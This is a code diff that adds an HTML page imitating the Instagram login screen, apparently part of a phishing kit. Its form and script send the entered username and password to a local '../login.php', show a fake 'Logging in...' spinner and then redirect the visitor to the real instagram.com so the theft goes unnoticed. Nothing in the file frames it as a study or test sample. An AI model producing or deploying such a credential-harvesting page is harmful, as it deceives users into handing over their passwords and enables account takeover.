@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 350px; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; margin-bottom: 10px; }
+        .logo { font-family: 'Billabong', cursive; font-size: 51px; margin-bottom: 24px; }
+        .input-field { width: 100%; padding: 9px 8px; font-size: 12px; border: 1px solid #dbdbdb; border-radius: 3px; margin-bottom: 6px; background: #fafafa; }
+        .input-field:focus { outline: none; border-color: #a8a8a8; }
+        .login-btn { width: 100%; padding: 7px 16px; font-size: 14px; font-weight: 600; color: white; background: #0095f6; border: none; border-radius: 8px; cursor: pointer; margin-top: 8px; }
+        .login-btn:hover { background: #1877f2; }
+        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
+        .divider::before { margin-right: 18px; }
+        .divider::after { margin-left: 18px; }
+        .forgot-link { font-size: 12px; color: #00376b; margin-top: 12px; }
+        .forgot-link a { text-decoration: none; color: #00376b; }
+        .signup-card { background: white; border: 1px solid #dbdbdb; padding: 24px; text-align: center; font-size: 14px; }
+        .signup-card a { color: #0095f6; text-decoration: none; font-weight: 600; }
+        .loading { display: none; padding: 20px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">Instagram</div>
+            <form id="loginForm" method="POST" action="../login.php">
+                <input type="text" name="username" class="input-field" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" class="input-field" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="divider">OR</div>
+            <div class="forgot-link"><a href="#">Forgot password?</a></div>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Logging in...</p>
+            </div>
+        </div>
+        <div class="signup-card">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.querySelector('form').style.display = 'none';
+            document.querySelector('.divider').style.display = 'none';
+            document.querySelector('.forgot-link').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            fetch('../login.php', { method: 'POST', body: new FormData(this) })
+            .then(() => setTimeout(() => window.location.href = 'https://www.instagram.com/', 2000));
+        });
+    </script>
+</body>
+</html>
